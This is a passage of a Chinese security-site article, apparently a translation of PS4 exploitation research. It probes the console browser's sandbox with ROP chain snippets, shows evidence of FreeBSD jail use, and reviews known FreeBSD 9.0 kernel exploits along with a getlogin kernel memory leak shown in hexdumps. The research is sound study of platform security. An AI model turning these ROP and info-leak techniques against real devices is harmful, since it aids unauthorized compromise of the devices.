<p>但是，由于沙盒的运行，我们没有完全访问到文件系统。如果你非要尝试读取确，那么这些被限制的文件和目录会给你错误2，ENOENT，“没有这样的文件或目录”的提示。</p>
<p>虽然如此，我们还是能读取到很多有意思的东西，包括加密后的文档等。我们将在下一篇文章中讨论更多关于文件系统的东西。</p>
<p><span style="font-size: 20px;"><strong>沙盒</strong></span></p>
<p>除了某些路径的文件相关系统调用失败，系统调用失败还会存在其他原因。最常见的是，被禁止的系统调用只会返回错误1，EPERM，“不允许操作”的提示;例如尝试使用ptrace，但其他系统调用可能会因为各种原因而失败：</p>
<p>兼容系统调用被禁用，如果你正在尝试调用mmap，你必须使用系统调用编号477，而不是71或197，否则会触发段错误。其他系统调用如退出也会触发错误提示：</p>
<pre>chain.syscall(&quot;exit&quot;,&nbsp;1,&nbsp;0);</pre>
<p>尝试创建SCTP套接字将返回错误0x2b，EPROTONOSUPPORT，这表示PS4内核中已禁用SCTP套接字：</p>
<pre>//int&nbsp;socket(int&nbsp;domain,&nbsp;int&nbsp;type,&nbsp;int&nbsp;protocol);
//socket(AF_INET,&nbsp;SOCK_STREAM,&nbsp;IPPROTO_SCTP);
chain.syscall(&quot;socket&quot;,&nbsp;97,&nbsp;2,&nbsp;1,&nbsp;132);</pre>
<p>虽然使用参数 PROT_READ | PROT_WRITE | PROT_EXEC 调用 mmap 会返回一个有效的指针，但 PROT_EXEC 标志会被忽略。读取它的保护将返回 3（RW），总而言之，任何执行内存的尝试都将触发段错误：</p>
<pre>chain.syscall(&quot;mmap&quot;,&nbsp;477,&nbsp;0,&nbsp;4096,&nbsp;1&nbsp;|&nbsp;2&nbsp;|&nbsp;4,&nbsp;4096,&nbsp;-1,&nbsp;0);
chain.write_rax_ToVariable(0);
chain.read_rdi_FromVariable(0);
chain.add(&quot;pop&nbsp;rax&quot;,&nbsp;0xfeeb);
chain.add(&quot;mov&nbsp;[rdi],&nbsp;rax&quot;);
chain.add(&quot;mov&nbsp;rax,&nbsp;rdi&quot;);
chain.add(&quot;jmp&nbsp;rax&quot;);</pre>
<p>在 PS4 中使用的开源软件清单中，没有任何例如 Capsicum 这样的沙盒软件，所以 PS4 必须使用单纯的 FreeBSD jail或者某些自定义的、专用的沙盒系统来进行尝试。</p>
<p><span style="font-size: 20px;"><strong>jail环境</strong></span></p>
<p>我们可以通过审核系统调用在jail环境的环境中执行的情况来证明PS4内核中频繁使用了FreeBSD Jails：</p>
<pre>chain.syscall(&quot;auditon&quot;,&nbsp;446,&nbsp;0,&nbsp;0,&nbsp;0);</pre>
<p>审核系统调用的第一件事是检查PS4内核中是否存在jail环境，如果存在，返回ENOSYS：</p>
<pre class=" language-c">if&nbsp;(jailed(td-&gt;td_ucred))
	return&nbsp;(ENOSYS);</pre>
<p>否则系统调用很可能会从mac_system_check_auditon返回EPERM：</p>
<pre class=" language-c">error&nbsp;=&nbsp;mac_system_check_auditon(td-&gt;td_ucred,&nbsp;uap-&gt;cmd);if&nbsp;(error)
	return&nbsp;(error);</pre>
<p>或者从 priv_check 开始：</p>
<pre class=" language-c">error&nbsp;=&nbsp;priv_check(td,&nbsp;PRIV_AUDIT_CONTROL);if&nbsp;(error)
	return&nbsp;(error);</pre>
<p>系统调用可能达到的绝对最大值将在priv_check之后立即执行，在返回EINVAL之前，由于length参数为0：</p>
<pre class=" language-c">if&nbsp;((uap-&gt;length&nbsp;&lt;=&nbsp;0)&nbsp;||&nbsp;(uap-&gt;length&nbsp;&gt;&nbsp;sizeof(union&nbsp;auditon_udata)))
	return&nbsp;(EINVAL);</pre>
<p>由于mac_system_check_auditon和priv_check将永远不会返回ENOSYS，因此ENOSYS可以返回的唯一方法便是对jail 的检查结果。执行ROP 链时，返回值是 ENOSYS（0x48）。这告诉我们，PS4使用的沙盒系统都是基于 jail 的，因为对 jail 的检查能够通过。</p>
<p><strong>FreeBSD 9.0内核漏洞利用</strong></p>
<p>尝试在FreeBSD 9.0内核源代码中寻找新的漏洞之前，我们应该首先检查是否可以在PS4上使用任何之前已经找到的内核漏洞。不过以下的漏洞绝不是我们要用的漏洞：</p>
<pre class="brush:html;toolbar:false">FreeBSD&nbsp;9.0-9.1&nbsp;mmap&nbsp;/&nbsp;ptrace&nbsp;：特权升级漏洞利用，因为如上所述，我们无法访问ptrace系统调用。
FreeBSD&nbsp;9.0&nbsp;：&nbsp;Intel&nbsp;SYSRET内核特权升级漏洞利用，由于PS4使用AMD处理器，因此无法正常工作。
FreeBSD内核：多个漏洞&nbsp;，也许只有第一个漏洞有用，但其他两个依赖于&nbsp;SCTP&nbsp;套接字，而SCTP&nbsp;套接字已被&nbsp;PS4&nbsp;内核禁用。</pre>
<p><strong>getlogin<br /></strong></p>
<p>看起来容易尝试的一个漏洞是使用getlogin系统调用来泄漏少量的内核内存。getlogin系统调用旨在将当前会话的登录名复制到用户内存中，但是由于系统漏洞，复制过来的不仅仅是登录名的字符串长度，连 整个缓冲区都要被复制过来。这意味着我们可以从内核读取一些未初始化的数据，这可能是有用的。</p>
<p>请注意，系统调用（49）实际上是int getlogin_r（char * name，int len）;而不是char * getlogin（void）;.</p>
<p>所以，让我们尝试将一些内核内存复制到用户内存中未使用的部分：</p>
<pre>chain.syscall(&quot;getlogin&quot;,&nbsp;49,&nbsp;chain.data,&nbsp;17);</pre>
<p>可是，我们只能获得17个字节，因为登录名被限制为MAXLOGNAME（来自&lt;sys / param.h&gt;）字符，目前包括 null 在内是 17。</p>
<p>执行ROP 链后，返回值为0，这意味着系统调用产生了效果。。现在，我们来看看所指向的内存变化。</p>
<p>执行ROP 链之前：</p>
<pre>00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00&nbsp;00
00</pre>
<p>执行ROP 链后：</p>
<pre>72&nbsp;6f&nbsp;6f&nbsp;74&nbsp;00&nbsp;fe&nbsp;ff&nbsp;ff&nbsp;08&nbsp;62&nbsp;61&nbsp;82&nbsp;ff&nbsp;ff&nbsp;ff&nbsp;ff
00</pre>
<p>在将前4个字节解码为ASCII码后：</p>
<pre>root</pre>
<p>所以ps4上浏览器是以root身份执行的。但更有趣的是，内存泄漏看起来像一个指向内核中的指针，每次运行ROP链时总是相同的，这从侧面证明了PS4没有内核ASLR。</p>
<p><span style="font-size: 20px;"><strong>总结</strong></span></p>
<p>从目前可用的信息来看，PS4 的内核与标准的 FreeBSD 9.0 内核非常相似。重要的是，存在的差异似乎来自标准内核配置更改（例如禁用SCTP套接字），而不是来自修改后的代码。索尼还向内核添加了自己的几个自定义系统调用，但除此之外，其他的内核似乎没有被修改过。</p>
<p>如此看来，我们倾向于相信PS4与FreeBSD 9.0的内核具有很多相同的漏洞。但是由于沙盒的存在（可能只是标准的 FreeBSD jail），大多数内核漏洞无法把WebKit作为攻击口。而FreeBSD 10出来之后，任何人都不可能在FreeBSD 9中隐藏任何私有漏洞，所以除非有一个新的漏洞被突然发现，否则我们就只能使用已有的那些漏洞。</p>
<p>目前来看，寻找漏洞的最好办法就是对可转储的模块进行逆向工程分析，以便尽可能多地发现索尼的自定义系统调用。</p>
                <div class="foot_description" style="background-color: #fff;">
                    本文参考来源于cturt.github，如若转载，请注明来源于嘶吼：                        <a href="http://www.4hou.com/technology/3973.html" target=_blank>http://www.4hou.com/technology/3973.html</a>
                                    </div>


                 </p>
            </div>
            <div class="article_con">
                <!--文章内容-->
            </div>
            <div class="post-like">
                <a href="javascript:;" data-action="ding" target=_blank data-id="3973" class="favorite">
                <div class="zanbox">
                    <dd class="zanbefor"></dd>
                    <dd class="zanafter"></dd>
                </div>
                <span class="zantext">点赞</span>
                <span class="count">
            0</span>
                </a>
            </div>
            <div class="active_bottom">
                <ul>
                    <a class="Sina" href="http://service.weibo.com/share/share.php?url=http://www.4hou.com/technology/3973.html" title="分享到新浪微博" target="_blank"><li class="sinahover"></li></a>
                    <a onclick="window.open('http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url='+encodeURIComponent(document.location.href));return false;" title="分享到QQ空间" class="WeChat" href="javascript:void(0)" target="_blank"><li class="kj"></li></a>
                    <a onclick="dashangToggle()" class="friend" title="分享到微信、朋友圈等" target="_blank"><li class="wx"></li></a>

                </ul>
                <div class="strat icons"><span class='wpfp-span'><img src='http://img.4hou.com/wp-content/plugins/wp-favorite-posts/img/star.png' alt='Favorite' title='Favorite' class='wpfp-img' /><a class='wpfp-link' href='?wpfpaction=add&amp;postid=3973' title='收藏' rel='nofollow'>收藏</a></span></div>
                <div class="hide_box"></div>
                <div class="shang_box">
                    <a class="shang_close" href="javascript:void(0)" onClick="dashangToggle()" title="关闭"><img src="http://img.4hou.com/wp-content/themes/4houv2/images/close.jpg" alt="取消" /></a>
                    <img class="shang_logo" width="120px" src="http://img.4hou.com/wp-content/themes/4houv2/images/logo.png" alt="嘶吼" />
                    <div class="shang_tit">
                        <p>感谢您的支持，我会继续努力的!</p>
                    </div>
                    <div class="shang_payimg">
                        <img src="http://www.4hou.com/wp-content/themes/4houv2/qrcode.php?url=http%3A%2F%2Fwww.4hou.com%2Ftechnology%2F3973.html" alt="扫码支持" title="扫一扫" />
                    </div>

                    <div class="shang_info">
                        <p>打开<span id="shang_pay_txt">微信</span>扫一扫后点击右上角即可分享哟</p>
                    </div>
                </div>
            </div>
            
            <div class="avatarbottomwrap">
                 <div class="avatarboxleft">
                        <div class="avatarbottom">
                           
                            <a class="upload-img"><img alt='xiaohui' src='http://img.4hou.com/wp-content/uploads/2017/06/4645ece03f124d9c2bb9-96x96.png' class='avatar avatar-96 photo' height='96' width='96' /></a>
                        </div>
                        <h1 class="authornamebottom"><a href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
                                xiaohui                                                            <i class="mem_level"></i>
                             </a></h1>
                        <p class="authorzybottom">嘶吼编辑</p>

                        <div class="authorbottombox">
                            <!--<div class="gzbtn">关注</div>
                            <div class="sxbtn">私信</div>-->
                                                            <span class="gzbtn"  style="cursor: pointer;" onclick="location.href='/mybox?action=reply&to_user=xiaohui&type=send'">发私信</span>
                                                    </div>
                 </div>
                <div class="authorother">
                 <a class="morearticle" href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                            <span class="swiper-pagination-bullet swiper-pagination-bullet-active"></span>
                             </a>
                    <div class="swiper-container">

                                                    <div class="swiper-wrapper">
                               
                                <div class="swiper-slide">
                                                                        <div><a href="http://www.4hou.com/technology/7667.html" target=_blank>
                                            <img data-original="/uploads/20170915/1505460611763833.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/technology/7638.html" target=_blank>
                                            <img data-original="http://img.4hou.com/wp-content/uploads/2017/09/dcf441e3e17ab9ef68ff.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/technology/7657.html" target=_blank>
                                            <img data-original="/uploads/20170915/1505404839986320.jpg?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                        <div><a href="http://www.4hou.com/technology/7600.html" target=_blank>
                                            <img data-original="/uploads/20170908/1504854270386868.png?imageView2/1/w/140/h/104/format/png"  class="wp-post-image"width="140" height="104"  />                                        </a></div>
                                                                    </div>
                            </div>
                                        </div>
                </div>
                <script type="text/javascript">
                    function dashangToggle(){
                        $(".hide_box").fadeToggle();
                        $(".shang_box").fadeToggle();
                    }
                </script>
                <script> 
                    var mySwiper = new Swiper('.swiper-container', {
                        direction : 'vertical',
                        pagination : '.swiper-pagination',
                        paginationClickable :true,
                        spaceBetween : 20
                    })
                </script>
            </div>
                            <div class="review" style="margin-bottom:80px;">
    <h3 id="reply-title" class="comment-reply-title">发表评论 <small></h3>
    <form action="http://www.4hou.com/wp-comments-post.php" method="post" id="commentform">
        <p class="commentname"><label for="author">昵称</label>
            <input type="text" name="author" id="author" value="" size="14" tabindex="1" aria-required='true' placeholder = "请输入昵称" required />
        </p>
        <p class="commenteml">
            <label for="email">邮箱</label>
            <input type="text" name="email" id="email" value="" size="25" tabindex="2" aria-required='true' placeholder = "请输入邮箱地址" required />
        </p>
        <p class="comment-form-comment">
           <label for="comment">评论</label>
           <textarea id="comment" name="comment" cols="45" rows="8" maxlength="65525" aria-required="true" required="required"></textarea>
        </p>

        <p class="form-submit"><input name="submit" type="submit" id="submit" class="submit" value="发表评论" />
        <input type='hidden' name='comment_post_ID' value="3973" id='comment_post_ID' />
            <input type='hidden' name='comment_parent' id='comment_parent' value='0' />
        </p>
    </form>
					
<div class="new-review">
   <ol class="commentlist">
   <div class="comment-box" id="li-comment-758">
    <div class="avatar fl"><img alt='蔡宁宁' src='http://img.4hou.com/wp-content/uploads/2017/06/80f6f72e9fe27d20a863-120x120.png' class='avatar avatar-120 photo' height='120' width='120' /></div>
    <!--评论列表-->
    <div class="user-comment">
    <!--评论人-->
  <a id="c-man" href="http://www.4hou.com/member?Author=%E8%94%A1%E5%AE%81%E5%AE%81" class="nick">蔡宁宁</a>
  <!--评论时间-->
  <span>2017-03-29 11:57</span>
  <!--评论内容-->
<p>感谢分析PS系列的破解&#8230;想必能想出来也是很不容易的</p>
  <!--回复按钮-->
  <div class="reply clearfix">
<a rel='nofollow' class='comment-reply-link' href='http://www.4hou.com/technology/3973.html?replytocom=758#respond' onclick='return addComment.moveForm( "comment-758", "758", "respond", "3973" )' aria-label='回复给蔡宁宁'>回复</a>  </div>
  </div>
<script>
  $("#replybtn").click(function(){
     $("#ta").text("");
     $("#comment").focus();
  })
</script>
  <!--评论审核提示-->
  <div class="comment_text">
  </div>
</div>
</li><!-- #comment-## -->
<div class="comment-box" id="li-comment-756">
    <div class="avatar fl"><img alt='高坂穗乃果' src='http://img.4hou.com/wp-content/uploads/2017/06/bfa6e5e55d7648b4a977-120x120.jpg' class='avatar avatar-120 photo' height='120' width='120' /></div>
    <!--评论列表-->
    <div class="user-comment">
    <!--评论人-->
  <a id="c-man" href="http://www.4hou.com/member?Author=%E9%AB%98%E5%9D%82%E7%A9%97%E4%B9%83%E6%9E%9C" class="nick">高坂穗乃果</a>
  <!--评论时间-->
  <span>2017-03-28 15:06</span>
  <!--评论内容-->
<p>索尼罪大滔天~</p>
  <!--回复按钮-->
  <div class="reply clearfix">
<a rel='nofollow' class='comment-reply-link' href='http://www.4hou.com/technology/3973.html?replytocom=756#respond' onclick='return addComment.moveForm( "comment-756", "756", "respond", "3973" )' aria-label='回复给高坂穗乃果'>回复</a>  </div>
  </div>
<script>
  $("#replybtn").click(function(){
     $("#ta").text("");
     $("#comment").focus();
  })
</script>
  <!--评论审核提示-->
  <div class="comment_text">
  </div>
</div>
</li><!-- #comment-## -->
   </ol>
   <div class="hr clearfix">&nbsp;</div>
</div>
</div>             
        </article>

        <!--作者其他文章-->
        <aside class="article_authorbox">
          <div class="article_authorbox_top">
                <div class="article_author">
            <div class="article_author_avatar">
                 <a class="upload-img"><img alt='xiaohui' src='http://img.4hou.com/wp-content/uploads/2017/06/4645ece03f124d9c2bb9-96x96.png' class='avatar avatar-96 photo' height='96' width='96' /></a>
            </div>
            <h1 class="article_author_name"><a href="http://www.4hou.com/member?Author=xiaohui" class="upload-img" target=_blank>
                    xiaohui                                    <i class="mem_level"></i>
                </a></h1>
            <p class="article_author_type">嘶吼编辑 </p>
            <div class="article_author_bottom">
                                        <span class="send-info" onclick="location.href='/mybox?action=reply&to_user=xiaohui&type=send'">发私信</span>
                         
            </div>
          </div>  
            <div class="interested">
                <h1>可能喜欢</h1>
                                                    <li>
                    <i></i>
                    <a href="http://www.4hou.com/technology/7667.html" target="_blank">小心找工作时被挖坑，有人利用 LinkedIn 发送钓鱼链接</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/technology/7653.html" target="_blank">一次服务器被攻击的应急行动</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/info/news/7646.html" target="_blank">一个Tor浏览器0day漏洞价值100万美元，其中的隐情是……</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/info/news/7660.html" target="_blank">Elasticsearche僵尸网络：超过4000台服务器遭到两款POS 恶意软件感染</a> 
                </li> 
                                <li>
                    <i></i>
                    <a href="http://www.4hou.com/technology/7669.html" target="_blank">渗透挑战赛：从SQL注入到管理员权限</a> 
                </li> 
                                                </div>
       </div>

          
        </aside>
    </section>
    <div id="zooming">
        <img src="" id="imgcon">
    </div>
    <script>
        $(document).ready(function() {
            $.fn.postLike = function() {
                if ($(this).hasClass('done')) {
                    return false;
                } else {
                    $(this).addClass('done');
                    var id = $(this).data("id"),
                        action = $(this).data('action'),
                        rateHolder = $(this).children('.count');
                    var ajax_data = {
                        action: "bigfa_like",
                        um_id: id,
                        um_action: action
                    };
                    $.post("/wp-admin/admin-ajax.php", ajax_data,
                        function(data) {
                            $(rateHolder).html(data);
                        });
                    return false;
                }
            };
            $(document).on("click", ".favorite",
                function() {
                    $(this).postLike();
                });


            $("img").attr("title","");
            var altcon=$(".art_title").text();
            $("img").attr("alt",altcon);
            // 图片放大
            $(".article_cen").find('img').on("click",function(){
                var imgsrc=$(this).attr("src");
                var winthimg=$(this).width();
                var zooming=winthimg*1.2;
                $("#imgcon").css({width:zooming});
                $("#imgcon").css({marginLeft:-zooming/2});
                $("#imgcon").attr("src",imgsrc);
                $("#zooming").addClass("zoomaniatae");
                $("#imgcon").addClass("imgconadimate");
            });
            $("#zooming").on("click",function(){
                $("#imgcon").removeClass("imgconadimate");
                $("#zooming").removeClass("zoomaniatae");

            });

            $(window).scroll(function(){
                var scrtop=$(window).scrollTop();
                if(scrtop>450){
                    $(".article_authorbox_top").removeClass("asideanimateleave").addClass('asideanimate')
                    // $(".interested").hide()
                }
                else if(scrtop<450&&scrtop>350){
                     $(".article_authorbox_top").addClass("asideanimateleave").removeClass('asideanimate')
                     $(".interested").show()

                }
            });
            var start=$(".strat .wpfp-span .wpfp-link").text()
            if(start=="已收藏"){
                $(".strat").addClass("stratend")
            }else{
                $(".strat").removeClass("stratend")
            }

            $(".avatar-96").width(72);
            $(".avatar-96").height(72);
            $(".avatar-120").width(50);
            $(".avatar-120").height(50);

        });
    </script>
<style type="text/css">
.footer{height:auto; background-color: #282828}
.footer_about{width: 1200px;height: 50px;padding-top: 26px; margin: 0 auto;border-bottom-color: transparent !important; position: relative;}
.footer_about>a{font-size: 16px;height: 16px !important;line-height: 16px !important; float: left; padding-right: 18px; border-right:1px solid #ccc;}
.last-child-a{border:none !important}
.footer_bottom_cen p{ margin-top: 5px; margin-right: 25px;text-align: left; margin-bottom: 6px;float: left;}
.footer_bottom_cen>div{width: 450px;float: left;margin-right: 8px}
.footer_bottom{height: 74px}
.footerlogos{width: 130px; height: 24px; position: absolute;right: 10%; top:24px;}
.footerlogos dd{float: left; margin-right: 20px;cursor: pointer;}
.footerlogos dd a{display: block;width: 100%; height: 100%}
.wechartlogo{width: 20px; height: 20px; background-position:-227px 0px;}
.weibologo{width: 20px; height: 20px; background-position:-269px 0px;}
.zhihulogo{width: 20px; height: 20px; background-position:-361px 0px;}
.wechartlogo i{width: 80px;height: 78px;background-size: contain !important; right: 137px;display: none;opacity: 1;background: url(http://www.4hou.com/wp-content/themes/4houv2/img/wechatqr.png) no-repeat;position: absolute;top: -28px;}
.wechartlogo:hover i{display: block;}
.footer_bottom{width: 1200px; background-color: #282828; margin:0 auto } 
.footer_bottom_cen>div img{float: left; margin-right: 4px;margin-top: 4px; margin-left: 4px;width: 66px;}
.footer_bottom_cen{width: 100%}
.cloudserver{float: right !important; margin: 0 auto !important;width: 385px !important; margin-top: -31px}
.cloudserver img{float: left;}
.cloudserver dd{float: left;}
@media screen and (max-width:1260px) {
    .footer{width: 100%; padding: 0px 20px;}
    .footer_about{width: 100%}
    .footer_bottom{width: 100%}
    .footer_bottom div{width: 100%;display: none;}
}
@media screen and (max-width:660px) {
    .footer_about{padding-top: 14px; margin-bottom: 22px;}
    .footerlogos{display: none;}
    .footer_bottom{height: 44px;}

}
</style>
<footer class="footer">
    <div class="footer_about">
        <a href="/about" target=_blank>关于我们</a>
        <!--<a href="">加入我们</a>-->
        <a href="/submit" target=_blank>我要投稿</a>
        <a href="/service" target=_blank>广告及服务</a>
        <a href="/partner" target=_blank class="last-child-a">友情链接</a>
        <div class="footerlogos">
                <dd class="wechartlogo icons">
                  <i></i>
                </dd>
                <dd class="weibologo icons">
                 <a href="http://weibo.com/u/6069423878" target=_blank></a>
                </dd>
                <dd class="zhihulogo icons">
                    <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank></a>
                    
                </dd>
        </div>
    </div>

    <section class="footer_bottom">
        <article class="footer_bottom_cen">
            <p>©2017 北京嘶吼文化传媒有限公司&nbsp;&nbsp;&nbsp;京ICP备16063439号</p>
            <p class="mobilefooter">©2017 北京嘶吼文化传媒有限公司&nbsp;&nbsp;|&nbsp;&nbsp;京ICP备16063439号</p>
            <div class="cloudserver">
                <span>本站由</span>
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/bdcloud.png">
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/bdcloud1.png">
                <img src="http://img.4hou.com/wp-content/themes/4houv2/img/ucloud.png">
                <span>提供云计算服务</span>
            </div>
        </article>
    </section>
    <section class="footer_top" style="display:none">
        <article class="footer_top_cen">
            <div class="homeqrcode">
                <dd class="icons"></dd>
                <div class="wb">
                    <a href="http://weibo.com/u/6069423878" target=_blank>
                    <i class="icons"></i>
                    <p>关注嘶吼传媒</p>
                    </a>
                </div>

                <div class="sh">
                    <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank>
                    <i class="icons"></i>
                    <p>关注嘶吼</p>
                    </a>
                </div>
            </div>
            
            <h1>合作伙伴</h1>
            <div class="footer_friend">
                <a href="http://www.xinhuanet.com/talking/chinasafety/" target=_blank>新华网安全中国</a>
                <a href="http://jaq.alibaba.com/" target=_blank>阿里聚安全</a>
                <a href="http://www.seclover.com/" target=_blank>四叶草安全</a>
                <a href="https://sec.vip.com/" target=_blank>唯品会安全应急响应中心</a>
                <a href="https://www.duoyinsu.com/" target=_blank>安识科技</a>
                <a href="http://xianzhi.aliyun.com" target=_blank>云盾先知</a>
                <a href="http://www.ardsec.com/" target=_blank>兴华永恒</a>
                <a href="https://www.sobug.com/" target=_blank>SOBUG</a>
            </div>
        </article>
    </section>
    
</footer>
<aside class="side" >
    <div class="side_top icons "></div>
    <div class="iconbox">
        <div class="side_wechart icons iconhover">微信
            <dd></dd>
        </div>
        <a href="http://weibo.com/u/6069423878" target=_blank><div class="side_webo icons iconhover">微博</div></a>
        <a href="http://www.4hou.com/feed/" target=_blank><div class="side_rss icons iconhover">RSS</div></a>
        <a href="https://zhuanlan.zhihu.com/roartalk" target=_blank><div class="side_zh icons iconhover">知乎</div></a>
    </div>
    <div class="side_bottom icons"></div>
    
</aside>

<script>
    var _hmt = _hmt || [];
    (function() {
        var hm = document.createElement("script");
        hm.src = "https://hm.baidu.com/hm.js?ac201c14c3d2a4747423252be421e1bc";
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(hm, s);
    })();
</script>

<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-91554508-1', 'auto');
    ga('send', 'pageview');

</script>
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>
</body>
</html>